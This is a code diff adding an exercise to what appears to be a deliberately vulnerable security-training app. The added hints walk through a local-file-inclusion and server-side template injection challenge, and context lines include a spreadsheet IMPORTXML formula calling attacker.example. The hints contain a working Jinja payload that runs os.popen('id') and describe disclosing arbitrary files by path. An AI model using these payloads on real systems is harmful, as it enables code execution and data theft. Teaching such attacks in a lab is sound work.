@@ -317,6 +317,19 @@ CATEGORIES.append(
                     "Google Sheets has no such prompt to click through. Post a comment with body =IMPORTXML(\"http://attacker.example/track\", \"//a/@href\") -- viewing this cell in Google Sheets silently fires a real outbound HTTP request to the attacker's server, confirming the payload landed with zero user interaction beyond opening the file.",
                 ],
             ),
+            ExampleNav(
+                id="file-inclusion-lfi-ssti",
+                title="LFI-to-SSTI via Unsanitized Snippet Include",
+                group="File Inclusion",
+                difficulty="Hard",
+                endpoint="a03_injection.file_inclusion",
+                hints=[
+                    "This 'custom snippet' feature saves text under a name you choose, and a separate feature reads a saved snippet back by that same name. Look at how the read side handles the name -- and what it does with the file's CONTENT once read.",
+                    "Save a snippet named test with the content {{ 7*7 }}, then render it back by name. If the result shows 49 instead of the literal text {{ 7*7 }}, the file's content is being evaluated as a live Jinja template, not displayed as data.",
+                    "Save a snippet containing the same SSTI payload chain used elsewhere in this category: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}. Render it back by name -- the real output of the id command comes back, proving genuine code execution through a feature that only ever looked like a text-storage tool.",
+                    "The include path also has zero validation on the name parameter itself -- exactly like this app's Path Traversal examples. Try rendering a snippet 'name' that's actually a bare absolute path to a file that was never saved through this feature at all -- its real contents come back too, proving arbitrary file disclosure works completely independently of the code-execution angle above.",
+                ],
+            ),
         ],
         seed_fn=seed_injection_data,
     )
